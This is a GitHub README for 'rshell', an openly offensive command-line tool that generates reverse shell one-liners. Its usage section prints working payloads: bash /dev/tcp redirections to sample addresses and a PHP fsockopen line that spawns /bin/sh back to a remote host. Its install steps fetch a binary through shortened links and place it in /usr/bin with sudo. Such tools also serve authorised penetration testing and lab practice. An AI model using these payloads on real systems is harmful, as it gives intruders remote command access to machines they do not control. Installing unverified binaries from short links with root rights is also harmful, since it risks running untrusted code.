# Rshell

Rshell is a automatic reverse shell generator

## Installation

Install [here](/releases/releases), or just execute this:

```bash
wget https://git.io/Jt5k5 -O rshell # to amd64
wget https://git.io/Jt5kA -O rshell # to i386
sudo mv rshell /usr/bin
```

or compile with source code, is easy, trust im my

```bash
git clone https://github.com/R3tr074/rshell
cd rshell
make && sudo make install
```

I say, easy

## Usage

```bash
$ rshell
bash -i >& /dev/tcp/127.0.0.1/1111 0>&1

$ export RHOST="10.10.10.10"
$ export RPORT="4545"
$ rshell
bash -i >& /dev/tcp/10.10.10.10/4545 0>&1

$ rshell -s php -p 1515
php -r '$sock=fsockopen("10.10.14.54",1515);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License

[MIT](https://github.com/R3tr074/rshell/blob/master/LICENCE)

## Problems

Some problem you can [create a issues](https://github.com/R3tr074/rshell/issues) or get in touch with [me](https://github.com/R3tr074#-get-in-touch)
